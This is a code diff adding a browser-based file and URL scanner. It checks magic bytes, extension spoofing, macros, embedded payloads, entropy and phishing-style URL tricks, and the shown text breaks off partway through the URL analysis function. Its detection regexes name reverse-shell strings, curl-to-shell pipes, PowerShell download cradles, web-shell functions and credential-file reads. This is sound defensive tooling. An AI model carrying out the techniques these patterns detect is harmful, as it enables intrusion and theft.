@@ -1,0 +1,419 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>File &amp; URL Scanner</title>
+<style>
+:root{box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);
+--bg:#f6f7f9;--card:#fff;--text:#16181d;--muted:#5f6672;--border:#dfe3ea;--accent:#2f5bea;--accent2:#7a4dea;--ok:#1a7f4b;--okbg:#e6f5ec;--warn:#9a6700;--warnbg:#fff4d6;--bad:#b42318;--badbg:#fde8e6;color-scheme:light}
+@media (prefers-color-scheme: dark){:root:not([data-theme="light"]){--bg:#0f1115;--card:#181b21;--text:#e8eaee;--muted:#9aa2af;--border:#2a2f38;--accent:#7b9bff;--accent2:#b394ff;--ok:#5fd493;--okbg:#12301f;--warn:#f0c05a;--warnbg:#3a2e0e;--bad:#ff8b80;--badbg:#3b1613;color-scheme:dark}}
+:root[data-theme="dark"]{--bg:#0f1115;--card:#181b21;--text:#e8eaee;--muted:#9aa2af;--border:#2a2f38;--accent:#7b9bff;--accent2:#b394ff;--ok:#5fd493;--okbg:#12301f;--warn:#f0c05a;--warnbg:#3a2e0e;--bad:#ff8b80;--badbg:#3b1613;color-scheme:dark}
+html{scroll-padding-top:env(safe-area-inset-top,0px)}
+*,*::before,*::after{box-sizing:inherit}
+body{margin:0;background:var(--bg);color:var(--text);font:16px/1.5 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif}
+main{max-width:760px;margin:0 auto;padding:28px 18px 48px}
+h1{font-size:1.7rem;margin:0 0 4px;background:linear-gradient(90deg,var(--accent),var(--accent2));-webkit-background-clip:text;background-clip:text;color:transparent;width:fit-content}
+.sub{color:var(--muted);margin:0 0 20px}
+.tabs{display:inline-flex;gap:4px;background:var(--card);border:1px solid var(--border);border-radius:12px;padding:4px;margin-bottom:16px}
+.tabs button{border:0;background:none;padding:8px 18px;border-radius:9px;font-size:.95rem}
+.tabs button[aria-selected=true]{background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff}
+.panel[hidden]{display:none}
+#drop{display:block;border:2px dashed var(--border);background:var(--card);border-radius:14px;padding:34px 18px;text-align:center;cursor:pointer;transition:border-color .15s}
+#drop:hover,#drop.over{border-color:var(--accent)}
+#drop strong{display:block;font-size:1.05rem}
+#drop span{color:var(--muted);font-size:.92rem}
+#file{display:none}
+textarea{width:100%;min-height:110px;font:.9rem ui-monospace,Menlo,Consolas,monospace;padding:12px;border-radius:12px;border:1px solid var(--border);background:var(--card);color:var(--text);resize:vertical}
+.samples{margin:14px 0 0;color:var(--muted);font-size:.9rem;display:flex;flex-wrap:wrap;gap:8px;align-items:center}
+button{font:inherit;font-size:.88rem;padding:6px 12px;border-radius:8px;border:1px solid var(--border);background:var(--card);color:var(--text);cursor:pointer}
+button:hover,button:focus-visible{border-color:var(--accent)}
+button.go{background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;border:0;margin-top:10px;padding:9px 18px}
+#bar{display:none;margin-top:18px;gap:8px;align-items:center;flex-wrap:wrap;color:var(--muted);font-size:.9rem}
+#json{display:none;margin-top:10px;min-height:140px}
+.res{margin-top:16px}
+.verdict{border-radius:12px;padding:14px 16px;margin-bottom:10px;border:1px solid}
+.vtop{display:flex;justify-content:space-between;align-items:baseline}
+.vtop b{font-size:1.1rem;letter-spacing:.02em}
+.score{font-weight:700}
+.vname{font-size:.9rem;opacity:.9;overflow-wrap:anywhere;margin:2px 0 8px}
+.meter{height:6px;border-radius:3px;background:rgba(127,127,127,.25);overflow:hidden}
+.meter i{display:block;height:100%;background:currentColor;border-radius:3px}
+.v-ok{background:var(--okbg);color:var(--ok);border-color:var(--ok)}
+.v-warn{background:var(--warnbg);color:var(--warn);border-color:var(--warn)}
+.v-bad{background:var(--badbg);color:var(--bad);border-color:var(--bad)}
+.v-neutral{background:var(--card);color:var(--muted);border-color:var(--border)}
+.card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:6px 16px;margin-bottom:10px}
+.finds{list-style:none;margin:0;padding:0}
+.finds li{display:flex;gap:10px;padding:8px 0;border-bottom:1px solid var(--border);align-items:baseline}
+.finds li:last-child{border-bottom:0}
+.chip{flex:0 0 auto;font-size:.7rem;font-weight:700;padding:2px 7px;border-radius:6px;min-width:64px;text-align:center}
+.s-info,.s-low{background:var(--okbg);color:var(--ok)}
+.s-med{background:var(--warnbg);color:var(--warn)}
+.s-high,.s-crit{background:var(--badbg);color:var(--bad)}
+.row{display:flex;gap:12px;padding:10px 0;border-bottom:1px solid var(--border)}
+.row:last-child{border-bottom:0}
+.k{flex:0 0 130px;color:var(--muted);font-size:.9rem}
+.v{flex:1;min-width:0;overflow-wrap:anywhere}
+.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:.85rem}
+details.card summary{cursor:pointer;padding:10px 0;font-weight:600}
+a{color:var(--accent)}
+.links{display:flex;flex-wrap:wrap;gap:12px;padding:10px 0;font-size:.88rem}
+img.prev{max-width:100%;max-height:260px;border-radius:10px;border:1px solid var(--border);margin-bottom:10px;display:block}
+.note{color:var(--muted);font-size:.85rem;margin-top:18px}
+@media (max-width:480px){.row{flex-direction:column;gap:2px}.k{flex:none}}
+</style>
+</head>
+<body>
+<main>
+  <h1>File &amp; URL Scanner</h1>
+  <p class="sub">Check any file’s real type and hidden risks, or analyze links, entirely in your browser.</p>
+
+  <div class="tabs" role="tablist">
+    <button role="tab" id="t1" aria-selected="true">Files</button>
+    <button role="tab" id="t2" aria-selected="false">URLs</button>
+  </div>
+
+  <div class="panel" id="p1">
+    <label id="drop" for="file">
+      <strong>Click to choose files, or drag them here</strong>
+      <span>Any file type, up to 100 MB each. Nothing is uploaded; scans run locally.</span>
+    </label>
+    <input type="file" id="file" multiple>
+    <div class="samples">Try a demo:
+      <button id="s1">EXE disguised as vacation.jpg</button>
+      <button id="s2">PDF disguised as report.png</button>
+      <button id="s4">Script with PowerShell</button>
+    </div>
+  </div>
+
+  <div class="panel" id="p2" hidden>
+    <textarea id="urls" placeholder="Paste one or more URLs, one per line" spellcheck="false"></textarea>
+    <button class="go" id="goUrl">Scan URLs</button>
+    <div class="samples">Try a demo: <button id="s3">Phishing-style link</button></div>
+  </div>
+
+  <div id="bar"><span id="status"></span><button id="copy">Copy JSON report</button><button id="dl">Download JSON report</button><button id="clear">Clear results</button></div>
+  <textarea id="json" readonly></textarea>
+  <section id="result" aria-live="polite"></section>
+
+  <p class="note">How it works: files are identified by their magic bytes, then checked for mismatched extensions, trailing or embedded payloads, macros, scripts, packers, entropy and suspicious strings. URLs are analyzed structurally for phishing and malware tricks. Results are heuristics, not proof of malware, and a clean result is not a guarantee. Live reputation databases need a server, so the result cards link out to them using only a hash or URL. This tool is not antivirus. Only scan files you own or may analyze.</p>
+</main>
+
+<script src="vendor/jszip.min.js"></script>
+<script>
+const $=id=>document.getElementById(id);
+const h=(t,c,...k)=>{const e=document.createElement(t);if(c)e.className=c;e.append(...k);return e};
+const hex=a=>[...a].map(x=>x.toString(16).padStart(2,"0")).join("");
+const H=s=>s.match(/../g).map(x=>parseInt(x,16));
+const MAXS=16*1048576,MAXF=100*1048576;
+const SEV={info:0,low:4,med:12,high:28,crit:45};
+const SL={info:"INFO",low:"LOW",med:"MEDIUM",high:"HIGH",crit:"CRITICAL"};
+const size=n=>n<1024?n+" B":n<1048576?(n/1024).toFixed(1)+" KB":(n/1048576).toFixed(1)+" MB";
+const RES=[];
+
+const SIGS=`0|89504E470D0A1A0A|PNG image|png|c
+0|FFD8FF|JPEG image|jpg,jpeg,jpe,jfif|c
+0|474946383761|GIF image|gif|c
+0|474946383961|GIF image|gif|c
+0|424D|BMP image|bmp|
+0|49492A00|TIFF image|tif,tiff|
+0|4D4D002A|TIFF image|tif,tiff|
+0|00000100|ICO icon|ico,cur|
+0|25504446|PDF document|pdf|
+0|504B0304|ZIP container|zip,docx,docm,xlsx,xlsm,pptx,pptm,jar,war,apk,aab,odt,ods,odp,epub,xpi,crx,nupkg,vsix,ipa,aar,xapk|c
+0|504B0506|ZIP container (empty)|zip|c
+0|526172211A07|RAR archive|rar|c
+0|377ABCAF271C|7-Zip archive|7z|c
+0|1F8B|GZIP archive|gz,tgz,svgz|c
+0|425A68|BZIP2 archive|bz2,tbz2|c
+0|FD377A585A00|XZ archive|xz,txz|c
+257|7573746172|TAR archive|tar|
+0|4D534346|Cabinet archive|cab|c
+0|4D5A|Windows executable|exe,dll,sys,scr,ocx,cpl,drv,efi,mui,com|x
+0|7F454C46|ELF executable|elf,so,bin,o,out,ko,|x
+0|CFFAEDFE|Mach-O executable|dylib,bin,o,macho,|x
+0|FEEDFACF|Mach-O executable|dylib,bin,o,macho,|x
+0|CEFAEDFE|Mach-O executable|dylib,bin,o,macho,|x
+0|CAFEBABE|Java class / Mach-O universal|class,dylib,bin,|x
+0|6465780A|Android DEX|dex|x
+0|0061736D|WebAssembly module|wasm|x
+0|2321|Script (shebang)|sh,bash,py,pl,rb,|x
+0|494433|MP3 audio|mp3|c
+0|4F676753|OGG media|ogg,oga,ogv,opus|c
+0|664C6143|FLAC audio|flac|c
+0|1A45DFA3|Matroska/WebM video|mkv,webm|c
+4|66747970|MP4/MOV media|mp4,m4a,m4v,mov,3gp,heic,heif,avif|c
+0|53514C69746520666F726D6174203300|SQLite database|db,sqlite,sqlite3|
+0|D0CF11E0A1B11AE1|OLE2 document|doc,xls,ppt,msi,msg,dot,xlt,pps,pub|
+0|7B5C727466|RTF document|rtf|
+0|4C00000001140200|Windows shortcut (LNK)|lnk|x
+0|25215053|PostScript|ps,eps|`.split("\n").map(l=>{const[o,s,n,e,f]=l.split("|");return{o:+o,s:H(s),n,e:e.split(","),x:f.includes("x"),c:f.includes("c")}});
+const PREVIEW={"PNG image":"image/png","JPEG image":"image/jpeg","GIF image":"image/gif","BMP image":"image/bmp","WebP image":"image/webp"};
+const DANGER=new Set("exe dll scr bat cmd com js jse vbs vbe ps1 hta lnk msi jar wsf cpl reg pif sh apk iso img docm xlsm pptm".split(" "));
+const CLAIM=new Set("png jpg jpeg gif bmp webp pdf zip docx xlsx pptx mp3 mp4 txt rtf doc xls ppt".split(" "));
+const TR=[[/<script[\s>]/i,"med","Embedded script block"],[/powershell|-enc(odedcommand)?\s|invoke-expression|\biex\b|downloadstring|frombase64string/i,"high","PowerShell execution or download-cradle keywords"],[/wscript\.shell|scripting\.filesystemobject|activexobject|createobject\s*\(/i,"med","Windows Script Host / ActiveX usage"],[/\beval\s*\(|unescape\s*\(|fromcharcode|document\.write\s*\(/i,"med","Obfuscation-style calls (eval, unescape, fromCharCode)"],[/\b(certutil|bitsadmin|regsvr32|mshta|rundll32|wmic)\b/i,"high","Living-off-the-land binary referenced"],[/cmd(\.exe)?\s*\/c/i,"med","cmd /c command execution"],[/(curl|wget)[^\n]*\|\s*(ba|z)?sh/i,"high","Pipes a download straight into a shell"],[/\/dev\/tcp\/|nc\s+-e|bash\s+-i/i,"crit","Reverse-shell pattern"],[/<\?php|base64_decode\s*\(|shell_exec|passthru\s*\(/i,"med","PHP code or web-shell functions"],[/hkey_(local_machine|current_user)|currentversion\\run/i,"med","Registry persistence keys"],[/[A-Za-z0-9+\/]{300,}={0,2}/,"low","Very long base64-like blob"],[/auto_?open|document_open|workbook_open/i,"med","Macro auto-run handler"],[/chmod\s+\+x|\/etc\/(passwd|shadow)/i,"low","Makes files executable or reads system credential files"]];
+const APIS=/VirtualAlloc(Ex)?|WriteProcessMemory|CreateRemoteThread|URLDownloadToFile|IsDebuggerPresent|SetWindowsHookEx|GetAsyncKeyState|NtUnmapViewOfSection|WinExec|ShellExecute|InternetOpenUrl|RegSetValueEx|AdjustTokenPrivileges|CryptEncrypt/g;
+const NS=/(w3\.org|openxmlformats\.org|schemas\.microsoft\.com|purl\.org|ns\.adobe\.com|openoffice\.org|xmlsoap\.org|apple\.com\/DTDs|xmlns)/i;
+
+function identify(u){
+  const at=(o,s)=>u.length>=o+s.length&&s.every((v,i)=>u[o+i]===v);
+  if(at(0,H("52494646"))){const t=String.fromCharCode(...u.subarray(8,12));return t==="WEBP"?{n:"WebP image",e:["webp"],c:1}:t==="WAVE"?{n:"WAV audio",e:["wav"]}:t==="AVI "?{n:"AVI video",e:["avi"]}:{n:"RIFF media",e:["wav","avi","webp","ani","rmi"]}}
+  for(const g of SIGS)if(at(g.o,g.s))return g;
+  if(at(32769,H("4344303031")))return{n:"ISO disc image",e:["iso"]};
+  return null;
+}
+function isText(u){const n=Math.min(u.length,4096);if(!n)return true;let bad=0;for(let i=0;i<n;i++){const c=u[i];if(c===0)return false;if(c<9||(c>13&&c<32&&c!==27))bad++}return bad/n<.02}
+function entropy(u){const n=Math.min(u.length,MAXS),f=new Uint32Array(256);for(let i=0;i<n;i++)f[u[i]]++;let e=0;for(const c of f)if(c){const p=c/n;e-=p*Math.log2(p)}return e}
+function trailing(u,t,lat){
+  const L=u.length;
+  if(t==="PNG image"){for(let i=L-4;i>=8;i--)if(u[i]===0x49&&u[i+1]===0x45&&u[i+2]===0x4E&&u[i+3]===0x44)return L-(i+8)}
+  else if(t==="JPEG image"){for(let i=L-2;i>=2;i--)if(u[i]===0xFF&&u[i+1]===0xD9)return L-(i+2)}
+  else if(t==="GIF image"){if(u[L-1]!==0x3B){const i=u.lastIndexOf(0x3B);return i<0?null:L-1-i}return 0}
+  else if(t==="PDF document"){const i=lat.lastIndexOf("%%EOF");return i<0?null:Math.max(0,L-(i+5)-(lat.slice(i+5).match(/^\s*/)[0].length))}
+  else if(t.startsWith("ZIP")){for(let i=L-22;i>=Math.max(0,L-65558);i--)if(u[i]===0x50&&u[i+1]===0x4B&&u[i+2]===5&&u[i+3]===6)return Math.max(0,L-(i+22+u[i+20]+u[i+21]*256))}
+  return null;
+}
+const dig=async(a,b)=>hex(new Uint8Array(await crypto.subtle.digest(a,b)));
+
+async function analyze(file){
+  const F=[],add=(s,t)=>F.push({s,t}),rows=[],R=(k,v,m)=>rows.push([k,v,m]);
+  const buf=await file.arrayBuffer(),u=new Uint8Array(buf),name=file.name;
+  const ext=name.includes(".")?name.split(".").pop().trim().toLowerCase():"";
+  const det=identify(u),txt=!det&&isText(u);
+  const lat=new TextDecoder("latin1").decode(u.length>MAXS?u.subarray(0,MAXS):u);
+  let type=det?det.n:txt?"Text / script":"Unknown binary";
+  const urlSet=new Set();
+  if(!u.length)add("low","The file is empty.");
+  if(u.length>MAXS)add("info","Only the first 16 MB were searched for strings and patterns.");
+
+  // filename tricks
+  if(/\u202e/.test(name))add("crit","Filename contains a right-to-left override character that reverses how the extension looks.");
+  if(/\.(pdf|docx?|xlsx?|pptx?|jpe?g|png|gif|txt|zip|mp[34])\s*\.(exe|scr|bat|cmd|com|js|vbs|ps1|hta|lnk|msi|jar|pif)$/i.test(name))add("high","Double extension: it looks like a document but ends in an executable type.");
+  if(/[ .]$/.test(name))add("med","Filename ends with a space or dot, a trick used to hide the real extension.");
+  if(/\s{5,}/.test(name))add("med","Filename has long runs of spaces that push the real extension out of sight.");
+
+  // type vs extension
+  if(det){
+    if(det.e.includes(ext)){}
+    else if(det.x)add("high","This is really an executable ("+det.n+") named ."+(ext||"(none)")+". Don’t open it.");
+    else add("med","Extension says ."+(ext||"(none)")+" but the content is "+det.n+".");
+  }else if(txt){
+    if(CLAIM.has(ext)&&ext!=="txt")add("med","Claims to be ."+ext+" but is plain text (could be HTML or a script in disguise).");
+  }else if(CLAIM.has(ext))add("med","Claims to be ."+ext+" but no matching signature was found.");
+  if(DANGER.has(ext)&&!(det&&det.x))add("low","."+ext+" is an inherently risky file type.");
+
+  // type-specific
+  const dv=new DataView(buf);
+  if(det&&det.n==="Windows executable"){
+    const pe=u.length>0x40?dv.getUint32(0x3c,true):0;
+    if(pe&&pe+24<u.length&&dv.getUint32(pe,true)===0x4550){
+      const m=dv.getUint16(pe+4,true),ns=dv.getUint16(pe+6,true),ts=dv.getUint32(pe+8,true),op=dv.getUint16(pe+20,true),ch=dv.getUint16(pe+22,true);
+      type=(ch&0x2000?"Windows DLL":"Windows PE executable")+" ("+({0x14c:"x86",0x8664:"x64",0xaa64:"ARM64",0x1c4:"ARM"}[m]||"machine 0x"+m.toString(16))+")";
+      const names=[];for(let i=0;i<Math.min(ns,40);i++){const o=pe+24+op+i*40;if(o+8>u.length)break;names.push(String.fromCharCode(...u.subarray(o,o+8)).replace(/\0/g,""))}
+      R("PE sections",ns+": "+names.join(", "),1);
+      R("Compile time",ts?new Date(ts*1000).toISOString().slice(0,10):"zeroed");
+      if(!ts||ts*1000>Date.now()+864e5)add("low","PE timestamp is zeroed or in the future (often forged or stripped).");
+      if(names.some(n=>/^(UPX|\.?themida|\.vmp|\.aspack|\.petite|\.nsp|MPRESS)/i.test(n))||/UPX!/.test(lat.slice(0,4096)))add("med","Known packer markers found (UPX, Themida, VMProtect and similar).");
+    }else{type="DOS/MZ stub (no PE header)";add("low","Starts with MZ but has no valid PE header: old DOS program, or not a real EXE.")}
+    add("low","Executable code: only run it if you trust the source.");
+    const api=[...new Set(lat.match(APIS)||[])];if(api.length>=3)add("med","Imports typical of injection, spying or downloaders: "+api.slice(0,6).join(", ")+".");
+  }else if(det&&det.x)add("low","Executable or script-like content: only run it if you trust the source.");
+
+  if(det&&det.n==="PDF document"){
+    if(!/^\s*%PDF/.test(lat.slice(0,1024)))add("low","PDF header is not at the start of the file.");
+    const PK=[[/\/JavaScript|\/JS\b/,"high","Contains JavaScript"],[/\/Launch\b/,"high","Contains a /Launch action that can run programs"],[/\/OpenAction|\/AA\b/,"med","Has an automatic action on open"],[/\/EmbeddedFile/,"med","Has an embedded file"],[/\/RichMedia|\/Flash/,"med","Has rich media / Flash content"],[/\/SubmitForm|\/ImportData/,"med","Can submit form data or import data"],[/\/XFA\b/,"low","Uses XFA forms"],[/\/Encrypt\b/,"low","Encrypted, so contents can’t be fully inspected"],[/\/[A-Za-z]*#[0-9a-fA-F]{2}/,"med","Uses hex-obfuscated object names"],[/\/ObjStm/,"low","Objects hidden in object streams (limits what this scan sees)"]];
+    for(const[re,s,t]of PK)if(re.test(lat))add(s,t+".");
+    for(const m of lat.matchAll(/\/URI\s*\(([^)]{4,300})\)/g))urlSet.add(m[1]);
+  }
+  if(det&&det.n==="OLE2 document"){
+    const t=lat.slice(0,3e6).replace(/\0/g,"");
+    const sub=/WordDocument/.test(t)?"Word (.doc)":/Workbook|Book\b/.test(t)?"Excel (.xls)":/PowerPoint Document/.test(t)?"PowerPoint (.ppt)":"";
+    if(sub){type="OLE2 / legacy "+sub}
+    if(/_VBA_PROJECT|\bVBA\b|Macros/.test(t))add("high","Contains VBA macro storage.");
+    if(/Equation Native|EQNEDT32/.test(t))add("crit","References the Equation Editor (used by CVE-2017-11882 exploits).");
+    if(/ObjectPool|Ole10Native/.test(t))add("med","Contains embedded OLE objects.");
+  }
+  if(det&&det.n==="RTF document"){
+    if(/\\objdata|\\objemb/i.test(lat))add("high","RTF embeds OLE objects, a common exploit vector.");
+    if(/\\\*\\template|\\objupdate/i.test(lat))add("med","RTF fetches a template or auto-updates objects.");
+  }
+  if(det&&det.n.startsWith("ZIP")&&window.JSZip&&u.length<60*1048576){
+    try{
+      const z=await JSZip.loadAsync(buf),names=Object.keys(z.files);
+      R("Archive entries",names.length+": "+names.slice(0,8).join(", ")+(names.length>8?" …":""),1);
+      const exp={docx:"word/",docm:"word/",xlsx:"xl/",xlsm:"xl/",pptx:"ppt/",pptm:"ppt/",jar:"META-INF/",apk:"AndroidManifest.xml",odt:"mimetype",ods:"mimetype",odp:"mimetype",epub:"mimetype"};
+      if(exp[ext]&&!names.some(n=>n.startsWith(exp[ext])))add("med","Named ."+ext+" but it lacks the "+exp[ext]+" structure, so it’s only a ZIP.");
+      const pkg=/^(jar|war|apk|aab|xapk|aar|xpi|crx|vsix|nupkg|ipa)$/.test(ext);
+      if(names.some(n=>/(^|\/)\.\.(\/|$)|^\/|^[a-z]:/i.test(n)))add("high","Entry paths use ../ or absolute paths (zip-slip path traversal).");
+      if(!pkg){const bx=names.filter(n=>/\.(exe|dll|scr|bat|cmd|com|js|jse|vbs|vbe|ps1|hta|lnk|msi|jar|wsf|cpl|reg|pif)$/i.test(n));if(bx.length)add("high","Contains executable or script files: "+bx.slice(0,4).join(", ")+".")}
+      const na=names.filter(n=>/\.(zip|rar|7z|gz|iso|img|cab)$/i.test(n));if(na.length)add("low","Contains nested archives or disk images: "+na.slice(0,3).join(", ")+".");
+      if(names.some(n=>/vbaProject\.bin$/i.test(n)))add(/m$/.test(ext)?"med":"high","Contains VBA macros"+(/m$/.test(ext)?" (expected for a macro-enabled file).":" inside a file type that normally has none."));
+      if(names.some(n=>/(embeddings|activeX)\//i.test(n)))add("med","Contains embedded objects or ActiveX controls.");
+      if(names.length>5000)add("low","Unusually many entries ("+names.length+"), a possible zip bomb.");
+      let ext2=0;for(const n of names.filter(n=>/_rels\/.*\.rels$/.test(n)).slice(0,40)){const x=await z.files[n].async("string");if(/TargetMode="External"/.test(x)){if(/attachedTemplate|oleObject|frame|externalLink/i.test(x))ext2++;for(const m of x.matchAll(/Target="(https?:[^"]+)"/g))urlSet.add(m[1])}}
+      if(ext2)add("high","Links to a remote template or OLE object (a known template-injection technique).");
+    }catch(e){add("med","ZIP structure is damaged or unreadable: "+e.message)}
+  }
+
+  // text and polyglot content
+  if(txt){
+    const body=lat.slice(0,2e6);
+    for(const[re,s,t]of TR)if(re.test(body))add(s,t+".");
+    if(/<svg[\s>]/i.test(body)&&/<script|onload=|onerror=/i.test(body))add("high","SVG contains script or event handlers.");
+  }else if(det&&/image/.test(det.n)&&/<\?php|<script|eval\(|base64_decode|wscript|powershell/i.test(lat))add("high","Script or PHP code is hidden inside an image (polyglot or web-shell trick).");
+  if(det&&!det.x&&!/ZIP|7-Zip|RAR|GZIP|Cabinet|XZ|BZIP2/.test(det.n)){
+    if(lat.indexOf("PK\x03\x04",4)>0&&lat.includes("PK\x01\x02"))add("high","A ZIP/JAR archive is embedded inside this "+det.n+" (polyglot).");
+    if(/This program cannot be run in DOS mode/.test(lat))add("high","A Windows executable is embedded inside this "+det.n+".");
+  }
+
+  // trailing, entropy
+  const tr=det?trailing(u,det.n,lat):null;
+  if(tr>0)add(tr>1024?"high":"med",tr+" bytes after the logical end of the "+det.n+". Possible hidden data.");
+  const en=u.length?entropy(u):0;
+  if(en>7.4&&!(det&&det.c)&&u.length>2048)add("med","Very high entropy ("+en.toFixed(2)+"/8): contents look packed, encrypted or compressed.");
+
+  // strings and URLs
+  const strs=lat.match(/[ -~]{8,}/g)||[];
+  for(const m of lat.matchAll(/\b(?:https?|ftp):\/\/[^\s"'<>\\^`{|}\x00-\x1f\x7f-\xff()]+/gi))urlSet.add(m[0].replace(/[.,;:\]]+$/,""));
+  const urls=[...urlSet].filter(x=>!NS.test(x)).slice(0,40);
+  const uRes=urls.slice(0,25).map(analyzeURL);
+  const badU=uRes.filter(r=>r.score>=45).length;
+  if(badU)add("med",badU+" high-risk URL"+(badU>1?"s":"")+" found inside the file.");
+  const ips=[...new Set((lat.match(/\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b/g)||[]).filter(x=>!/^(0|127)\./.test(x)))];
+  const emails=[...new Set(lat.match(/[\w.+-]{2,}@[\w-]+\.[\w.-]{2,}/g)||[])];
+
+  // details
+  let hash="unavailable in this browser",sha1="";
+  if(window.crypto&&crypto.subtle){hash=await dig("SHA-256",buf);sha1=await dig("SHA-1",buf)}
+  const base=[["File name",name],["Size",size(file.size)],["Claimed extension",ext?"."+ext:"(none)"],["Detected type",type],["First bytes (hex)",hex(u.subarray(0,16)).replace(/(..)/g,"$1 ").trim(),1],["Entropy",u.length?en.toFixed(3)+" / 8":"n/a"],["Trailing data",tr===null?"n/a for this type":tr>0?tr+" bytes":"None found"],["Printable strings",strs.length+(ips.length&&!(det&&det.c)?". IP-like: "+ips.slice(0,6).join(", "):"")+(emails.length?". Emails: "+emails.slice(0,4).join(", "):"")],["SHA-256",hash,1],["SHA-1",sha1||"n/a",1]];
+  base.splice(4,0,...rows);
+  const score=Math.min(100,F.reduce((a,f)=>a+SEV[f.s],0));
+  const links=hash.length===64?[["Look up hash on VirusTotal","https://www.virustotal.com/gui/file/"+hash],["MalwareBazaar","https://bazaar.abuse.ch/browse.php?search=sha256%3A"+hash]]:[];
+  const prev=det&&PREVIEW[det.n]?URL.createObjectURL(new Blob([buf],{type:PREVIEW[det.n]})):null;
+  return{title:name,score,F,rows:base,links,prev,urls:uRes,neutral:!det&&!txt&&!F.length};
+}
+
+// ---------- URL analysis ----------
+const lev=(a,b)=>{const d=[...Array(b.length+1).keys()];for(let i=1;i<=a.length;i++){let p=d[0];d[0]=i;for(let j=1;j<=b.length;j++){const t=d[j];d[j]=Math.min(d[j]+1,d[j-1]+1,p+(a[i-1]===b[j-1]?0:1));p=t}}return d[b.length]};
+const defang=s=>s.replace(/^http/i,"hxxp").replace(/\./g,"[.]");
+const SHORT=new Set("bit.ly tinyurl.com t.co goo.gl ow.ly is.gd buff.ly rebrand.ly cutt.ly shorturl.at t.ly rb.gy tiny.cc bl.ink s.id v.gd lnkd.in soo.gd trib.al adf.ly qr.ae shorte.st".split(" "));
+const BADTLD=new Set("zip mov top xyz tk ml ga cf gq click link work support country kim loan men review rest fit cam icu buzz monster sbs cyou cfd bar surf quest cc ws su".split(" "));
+const FREEH=/(pages\.dev|workers\.dev|web\.app|firebaseapp\.com|netlify\.app|vercel\.app|github\.io|blogspot\.com|weebly\.com|wixsite\.com|herokuapp\.com|ngrok(-free)?\.(io|app)|trycloudflare\.com|duckdns\.org|no-ip\.(org|com)|ddns\.net|000webhostapp\.com|glitch\.me|repl\.co|r2\.dev|s3\.amazonaws\.com|storage\.googleapis\.com|ipfs\.|forms\.gle|sites\.google\.com)$/i;
+const BR=Object.fromEntries("paypal:paypal.com apple:apple.com icloud:icloud.com,apple.com microsoft:microsoft.com,microsoftonline.com,live.com,office.com,outlook.com,windows.com google:google.com,gmail.com,youtube.com amazon:amazon.com facebook:facebook.com,fb.com instagram:instagram.com netflix:netflix.com linkedin:linkedin.com dropbox:dropbox.com docusign:docusign.com,docusign.net adobe:adobe.com whatsapp:whatsapp.com binance:binance.com coinbase:coinbase.com metamask:metamask.io chase:chase.com wellsfargo:wellsfargo.com bankofamerica:bankofamerica.com hsbc:hsbc.com fnb:fnb.co.za absa:absa.co.za nedbank:nedbank.co.za standardbank:standardbank.co.za capitec:capitecbank.co.za sars:sars.gov.za dhl:dhl.com fedex:fedex.com steam:steampowered.com,steamcommunity.com discord:discord.com telegram:telegram.org".split(" ").map(s=>{const[k,v]=s.split(":");return[k,v.split(",")]}));
+function analyzeURL(raw){
+  const F=[],add=(s,t)=>F.push({s,t});let s=String(raw).trim();
+  if(!/^([a-z][a-z0-9+.-]*:\/\/|(javascript|data|vbscript|file|blob|mailto):)/i.test(s))s="http://"+s;
+  let u;try{u=new URL(s)}catch{return{title:raw,score:12,F:[{s:"med",t:"This isn’t a valid URL."}],rows:[],links:[],urls:[],def:defang(String(raw))}}
+  const sch=u.protocol.slice(0,-1),host=u.hostname.toLowerCase(),m=s.match(/^[a-z]+:\/\/(?:[^\/?#@]*@)?([^\/?#:]*)/i),oh=m?m[1]:"";
+  if(/^(javascript|data|vbscript|file|blob)$/.test(sch))add("high",sch+": links can run code or open local content instead of loading a website.");
+  else if(sch==="http")add("low","Not encrypted (http). Never enter passwords or card details here.");
+  else if(sch==="ftp")add("low","Uses FTP, an unencrypted legacy protocol.");
+  if(/[^\x00-\x7f]/.test(oh)){add(/[a-z]/i.test(oh)&&/[\u0370-\u03ff\u0400-\u04ff]/.test(oh)?"crit":"med",/[a-z]/i.test(oh)&&/[\u0370-\u03ff\u0400-\u04ff]/.test(oh)?"Domain mixes Latin letters with Cyrillic or Greek lookalikes (homograph attack).":"Domain uses non-ASCII characters (internationalized domain), which can imitate real brands.")}
+  const labels=host.split(".");
+  if(labels.some(l=>l.startsWith("xn--")))add("med","Punycode domain (xn--): check that it isn’t imitating another site.");
+  if(/^(0x[0-9a-f]+|\d+)$/i.test(oh)||/(^|\.)0\d+(\.|$)/.test(oh)||/^0x/i.test(oh))add("high","Host is an obfuscated numeric IP address (decimal, hex or octal form).");
+  else if(/^\d{1,3}(\.\d{1,3}){3}$/.test(host)){add("med","Host is a raw IP address instead of a domain name.");if(/^(10\.|127\.|192\.168\.|169\.254\.|172\.(1[6-9]|2\d|3[01])\.|0\.)/.test(host))add("med","Points to a private or loopback address (internal-network or SSRF target).")}
+  else if(host.startsWith("["))add("low","Host is an IPv6 literal.");
+  else if(host==="localhost"||/\.(local|internal|lan)$/.test(host))add("med","Points to a local or internal hostname.");
+  if(u.username){const n=decodeURIComponent(u.username);add(/\./.test(n)?"crit":"high","Credentials section hides the real host: this link goes to "+host+", not "+n+".")}
+  if(u.port&&!["80","443"].includes(u.port))add("low","Non-standard port "+u.port+".");
+  if(host.endsWith("."))add("low","Trailing dot after the hostname.");
+  const tld=labels[labels.length-1];
+  const reg=labels.length>=3&&/^(co|com|org|net|gov|ac|edu|nom)$/.test(labels[labels.length-2])&&tld.length===2?labels.slice(-3).join("."):labels.slice(-2).join(".");
+  const subs=labels.length-(reg.split(".").length);
+  if(subs>=4)add("med",subs+" subdomain levels. Attackers bury the real domain on the right.");
+  else if(subs===3)add("low","Three subdomain levels.");
+  if(SHORT.has(host))add("med","URL shortener: the final destination is hidden.");
